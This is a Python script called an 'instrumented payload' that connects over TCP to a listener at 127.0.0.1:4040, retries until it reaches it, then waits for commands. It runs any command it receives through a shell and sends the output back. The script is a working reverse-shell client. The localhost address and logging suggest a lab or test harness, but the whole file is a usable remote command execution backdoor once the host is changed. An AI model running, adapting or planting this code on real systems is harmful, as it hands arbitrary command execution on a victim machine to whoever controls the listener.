#!/usr/bin/env python3
import socket
import time
import sys
import subprocess
import json

class InstrumentedPayload:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 4040
        self.connected = False
        
    def connect(self):
        print(f"[Payload] Connecting to {self.host}:{self.port}")
        
        while not self.connected:
            try:
                self.sock = socket.socket()
                self.sock.connect((self.host, self.port))
                self.connected = True
                print("[Payload] Connected successfully")
                
                # Send identification
                self.sock.send(b'INSTRUMENTED_PAYLOAD\n')
                
            except Exception as e:
                print(f"[Payload] Connection failed: {e}")
                time.sleep(2)
    
    def command_loop(self):
        while self.connected:
            try:
                # Receive command
                data = self.sock.recv(1024)
                if not data:
                    break
                    
                cmd = data.decode().strip()
                print(f"[Payload] Received command: {cmd}")
                
                # Execute command
                if cmd == 'exit':
                    break
                elif cmd == 'test':
                    output = "Test successful"
                elif cmd == 'info':
                    output = json.dumps({
                        'type': 'instrumented',
                        'version': '1.0',
                        'pid': os.getpid()
                    })
                else:
                    try:
                        result = subprocess.check_output(cmd, shell=True, timeout=5)
                        output = result.decode()
                    except Exception as e:
                        output = f"Error: {e}"
                
                # Send response
                self.sock.send((output + '\n').encode())
                print(f"[Payload] Sent response: {len(output)} bytes")
                
            except Exception as e:
                print(f"[Payload] Error: {e}")
                self.connected = False
    
    def run(self):
        self.connect()
        self.command_loop()
        print("[Payload] Exiting")

if __name__ == "__main__":
    import os
    payload = InstrumentedPayload()
    payload.run()
